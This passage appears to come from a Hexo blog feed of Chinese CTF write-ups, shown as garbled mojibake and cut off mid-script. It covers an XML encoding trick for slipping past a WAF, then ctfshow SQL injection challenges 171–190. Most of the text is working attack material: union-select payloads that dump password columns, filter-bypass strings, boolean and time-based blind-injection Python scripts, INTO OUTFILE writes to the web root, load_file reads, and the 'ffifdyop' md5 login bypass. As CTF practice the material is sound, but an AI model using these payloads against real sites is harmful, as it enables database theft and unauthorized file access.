punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>users</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¢«WAFæ‹¦æˆªäº†ï¼Œé€‰æ‹©ç¼–ç ç»•è¿‡</p><blockquote><p>é™¤äº†å‰é¢æåˆ°çš„xmlæ–‡æ¡£çš„ä¸‰ä¸ªéƒ¨åˆ†ä¹‹å¤–ï¼Œè¿˜æœ‰ä½äºå®ƒä»¬ä¹‹ä¸Šçš„ç¬¬å››ä¸ªéƒ¨åˆ†ï¼Œå®ƒä»¬æ§åˆ¶æ–‡æ¡£çš„ç¼–ç ï¼ˆä¾‹å¦‚<?xml?>ï¼‰â€”â€”æ–‡æ¡£çš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¸¦æœ‰å¯é€‰çš„BOM(å­—èŠ‚é¡ºåºæ ‡è®°)ã€‚<br>æ›´å¤šä¿¡æ¯ï¼š<a href="https://www.w3.org/TR/xml/#sec-guessing">https://www.w3.org/TR/xml/#sec-guessing</a><br>ä¸€ä¸ªxmlæ–‡æ¡£ä¸ä»…å¯ä»¥ç”¨UTF-8ç¼–ç ï¼Œä¹Ÿå¯ä»¥ç”¨UTF-16(ä¸¤ä¸ªå˜ä½“â€Š-â€ŠBEå’ŒLE)ã€UTF-32(å››ä¸ªå˜ä½“â€Š-â€ŠBEã€LEã€2143ã€3412)å’ŒEBCDICç¼–ç ã€‚<br>åœ¨è¿™ç§ç¼–ç çš„å¸®åŠ©ä¸‹ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯ä»¥å¾ˆå®¹æ˜“åœ°ç»•è¿‡WAFï¼Œå› ä¸ºåœ¨è¿™ç§ç±»å‹çš„WAFä¸­ï¼Œæ­£åˆ™è¡¨è¾¾å¼é€šå¸¸ä»…é…ç½®ä¸ºå•å­—ç¬¦é›†ã€‚<br>å¤–æ¥ç¼–ç ä¹Ÿå¯ç”¨äºç»•è¿‡æˆç†Ÿçš„WAFï¼Œå› ä¸ºå®ƒä»¬å¹¶ä¸æ€»æ˜¯èƒ½å¤Ÿå¤„ç†ä¸Šé¢åˆ—å‡ºçš„æ‰€æœ‰ç¼–ç ã€‚ä¾‹å¦‚ï¼Œlibxml2è§£æå™¨åªæ”¯æŒä¸€ç§ç±»å‹çš„utf-32â€Š-â€Šutf-32BEï¼Œç‰¹åˆ«æ˜¯ä¸æ”¯æŒBOMã€‚</p></blockquote><p>ä½¿ç”¨å‘½ä»¤æ›´æ”¹ç¼–ç </p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cat 1.xml | iconv -f UTF-8 -t UTF-16BE &gt; x16.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è®°å¾—å§å†…å®¹æ”¾åˆ°introä¸­ï¼Œä¸ç„¶ä¼šè¢«è£åˆ‡</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>https://blog.gem-love.com/ctf/2283.htmlæ³¨å…¥</title>
      <link href="/posts/38885.html"/>
      <url>/posts/38885.html</url>
      
        <content type="html"><![CDATA[<p><strong>171</strong></p><p>å…¥é—¨å¼€å§‹ï¼Œç›´æ¥union select</p><pre class="line-numbers language-none"><code class="language-none">database:ctfshow_webtable:ctfshow_user0&#39; union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>172</strong></p><pre class="line-numbers language-none"><code class="language-none">database:ctfshow_webtable:ctfshow_user20&#39; union select 1,group_concat(password) from ctfshow_web.ctfshow_user2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>173</strong></p><pre class="line-numbers language-none"><code class="language-none">database:ctfshow_webtable:ctfshow_user30&#39; union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>174</strong></p><p>è¿”å›å†…å®¹ä¸­ä¸èƒ½æœ‰æ•°å­—äº†ï¼Œè¯•è¯•å¸ƒå°”æ³¨å…¥å§</p><p>select * from tableName limit i,n</p><p>iä¸ºç´¢å¼•ï¼Œnä¸ºæ•°é‡</p><p>éšä¾¿å†™çš„åƒåœ¾è„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1=     &amp;page=1&amp;limit=10"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sql <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((select password from ctfshow_user4 limit 24,1),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">,1,0)"</span></span>        url<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">--+&amp;page=1&amp;limit=10"</span></span>        tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">'admin'</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sql <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((select password from ctfshow_user4 limit 24,1),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">,1,0)"</span></span>        url<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">--+&amp;page=1&amp;limit=10"</span></span>        tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">'admin'</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>175</strong></p><p>å•¥éƒ½æ²¡äº†æ—¶é—´ç›²æ³¨</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1&amp;page=1&amp;limit=10"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sql <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((select password from ctfshow_user5 limit 24,1),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(2),0)"</span></span>        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1'and 1=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">--+&amp;page=1&amp;limit=10"</span></span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sql <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((select password from ctfshow_user5 limit 24,1),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(2),0)"</span></span>        url<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1'and 1=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">--+&amp;page=1&amp;limit=10"</span></span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ–è€…è¯•è¯•æ–‡ä»¶è¯»å†™</p><pre class="line-numbers language-none"><code class="language-none">1&#39; union select 1,password from ctfshow_user5 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>176</strong></p><p>è¿‡æ»¤äº†union selectï¼Œå¤§å°å†™ç»•è¿‡æˆ–ä¸‡èƒ½å¯†ç <code>1&#39; or 1=1--+</code></p><pre class="line-numbers language-none"><code class="language-none">database:ctfshow_webtable:ctfshow_user0&#39; unIon sElEct 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>177</strong></p><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œ/**/å³å¯ï¼Œä¸èƒ½ç”¨+ï¼Œurlä¼šè¢«è½¬æˆç©ºæ ¼</p><pre class="line-numbers language-none"><code class="language-none">0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(password)&#x2F;**&#x2F;from&#x2F;**&#x2F;ctfshow_user%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>178</strong></p><p>è¿‡æ»¤äº†ç©ºæ ¼å’Œ*ï¼Œåˆ¶è¡¨ç¬¦%09ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">0&#39;%09union%09select%091,2,group_concat(password)%09from%09ctfshow_user%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>179</strong></p><p>%09ä¹Ÿæ²¡äº†ï¼Œè¿˜å‰©%0c</p><pre class="line-numbers language-none"><code class="language-none">0&#39;%0cunion%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>180</strong></p><p>çœŸæ²¡æ‹›äº†ï¼Œçœ‹çœ‹wpï¼Œé€šè¿‡åå¼•å·åˆ†å‰²ï¼Œç»</p><pre class="line-numbers language-none"><code class="language-none">0&#39;union%0cselect&#39;1&#39;,(select&#96;password&#96;from&#96;ctfshow_user&#96;where&#96;username&#96;&#x3D;&#39;flag&#39;),&#39;3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿˜æœ‰</p><pre class="line-numbers language-none"><code class="language-none">0&#39;or(id&#x3D;26)and&#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>181</strong></p><p>selectä¸è§äº†ï¼Œä¸‡èƒ½å¯†ç </p><pre class="line-numbers language-none"><code class="language-none">0&#39;%0cor%0cid&#x3D;&#39;26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>182</strong></p><p>flagä¸è§äº†ï¼Œå…¶å®ä¸å½±å“ä¸Šé¢çš„ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥å°è¯•æ¨¡ç³ŠåŒ¹é…</p><pre class="line-numbers language-none"><code class="language-none">0&#39;%0cor%0cusername%0clike%0c&#39;%fla%<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>183</strong></p><p>ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å’Œå¸ƒå°”ç›²æ³¨</p><pre class="line-numbers language-none"><code class="language-none">WHERE email REGEXP &#39;a&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ„æ€æ˜¯åœ¨emailä¸­åŒ¹é…açš„</p><p>å†™è„šæœ¬å’¯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://24a744c9-dd02-415a-b46b-68e87b328edd.challenge.ctf.show/select-waf.php'</span>flagstr <span class="token operator">=</span> <span class="token string">r"&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'tableName'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"(ctfshow_user)where(substr(pass,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">')"</span></span>        <span class="token punctuation">&#125;</span>        tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>184</strong></p><p>RIGHT JOIN å…³é”®å­—ä¼šå³è¡¨ (table_name2) é‚£é‡Œè¿”å›æ‰€æœ‰çš„è¡Œï¼Œå³ä½¿åœ¨å·¦è¡¨ (table_name1) ä¸­æ²¡æœ‰åŒ¹é…çš„è¡Œã€‚</p><pre class="line-numbers language-none"><code class="language-none">SELECT column_name(s)FROM table_name1RIGHT JOIN table_name2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬å°†åŒ¹é…åçš„è¡¨ä½œä¸ºå³è¡¨ï¼Œä½¿ç”¨æ­£åˆ™æŸ¥è¯¢å³å¯</p><p><code>ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,&#123;i&#125;,1)regexp(char(&#123;ord(j)&#125;)))</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://cf6d0357-c567-4db6-9fab-5827e7d5e40d.challenge.ctf.show/select-waf.php'</span>flagstr <span class="token operator">=</span> <span class="token string">r"&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'tableName'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)regexp(char(</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)))"</span></span>        <span class="token punctuation">&#125;</span>        tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"$user_count = 43;"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è®°å¾—é—®onæ˜¯å•¥æ„æ€</p><p><strong>185</strong></p><p>è¿‡æ»¤äº†æ•°å­—ï¼Œç”¨true=1ç›¸åŠ æ„é€ æ•°å­—å’§</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://7cdec59f-0059-4f5d-ac07-fcac41696822.challenge.ctf.show/select-waf.php'</span>flagstr <span class="token operator">=</span> <span class="token string">r"&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;"</span><span class="token keyword">def</span> <span class="token function">lo</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp<span class="token operator">=</span><span class="token string">"true"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp<span class="token operator">=</span>tmp<span class="token operator">+</span><span class="token string">"+true"</span>    <span class="token keyword">return</span> tmp<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'tableName'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>lo<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">),(true))regexp(char(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>lo<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)))"</span></span>        <span class="token punctuation">&#125;</span>        tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"$user_count = 43;"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>186</strong></p><p>åŒä¸Šï¼Œå¼€æ‰“å°±å®Œäº†</p><p><strong>187</strong></p><p>é’ˆå¯¹<code>md5(xxx,true)</code>çš„ç»•è¿‡ï¼š<a href="https://blog.csdn.net/solitudi/article/details/107813286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160631731619195283021913%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160631731619195283021913&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107813286.pc_v2_rank_blog_default&utm_term=md5%20%20_POST%20%20password%20%20,true&spm=1018.2118.3001.4450">é“¾æ¥</a></p><p>åªèƒ½å¯»æ‰¾md5</p><p>æ‰€ä»¥å¯†ç è¾“å…¥:ffifdyopå³å¯</p><p>è¿›è¡Œè¿ç®—å¾—å‡ºçš„ç»“æœä¸º</p><p>â€˜orâ€™6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b</p><p>ç”±äºoråé¢6ä¸ºçœŸï¼Œæ‰€ä»¥è¯­å¥æ’ä¸ºçœŸ</p><p><strong>188</strong></p><p>SQLæ¯”è¾ƒçœŸçœŸç¦»è°±</p><p>å­—ç¬¦ä¸²å½“ä½œæ•°å­—å¤„ç†</p><p>å³å½“mysqlä¸­å­—ç¬¦ä¸²ä¸æ•°å­—åšæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå°†å­—ç¬¦ä¸²å½“ä½œæ•°å­—æ¥æ¯”è¾ƒã€‚å¦‚123bacä¼šå½“ä½œ123å¤„ç†ã€‚  å› æ­¤æˆ‘ä»¬åœ¨æŸ¥è¯¢çš„æ—¶å€™å³ä½¿username=0ï¼Œä¹Ÿä¼šè¿”å›ä¸€äº›ä»¥0å¼€å¤´çš„æ•°æ®ã€‚</p><p>00å³å¯</p><p><strong>189</strong></p><p>ç©ºæ ¼æ¶ˆå¤±æ³•ï¼Œæç¤ºflagåœ¨api/flag.phpä¸­ï¼Œå¿…ç„¶è¦è¯»å–æ–‡ä»¶å’¯</p><p>å°è¯•ç”¨æˆ·åå‘ç°åªæœ‰ä¸¤ç§å›æ˜¾ç»“æœï¼Œä¸€ç§æ˜¯æŸ¥è¯¢å¤±è´¥ï¼Œä¸€ç§æ˜¯å¯†ç é”™è¯¯</p><p>å¸ƒå°”ç›²æ³¨èµ°èµ·</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://36ec0642-dfd4-460f-951d-afbf1887db2c.challenge.ctf.show/api/index.php'</span>flagstr <span class="token operator">=</span> <span class="token string">r"&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;"</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>tmp<span class="token operator">=</span>flag<span class="token operator">+</span>jdata <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'if(load_file("/var/www/html/api/index.php")regexp(\'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">\'),0,1)#'</span></span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">"å¯†ç é”™è¯¯"</span> <span class="token keyword">in</span> tex<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>flag<span class="token operator">=</span>flag<span class="token operator">+</span>j<span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>190</strong></p><p>è¿›è¡Œä¸€ä¸ªå¸ƒå°”çš„ç›²æ³¨</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://f808d3c6-5e32-4c6c-a217-16eb4cd1c842.challenge.ctf.show/api/'</span>flagstr <span class="token operator">=</span> <span class="token string">r"&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;"</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>tmp<span class="token operator">=</span>flag<span class="token operator">+</span>jdata <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"admin' and ((substr((select f1ag from ctfshow_fl0g),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">')#"</span></span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">"å¯†ç é”™è¯¯"</span> <span class="token keyword">in</span> tex<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token 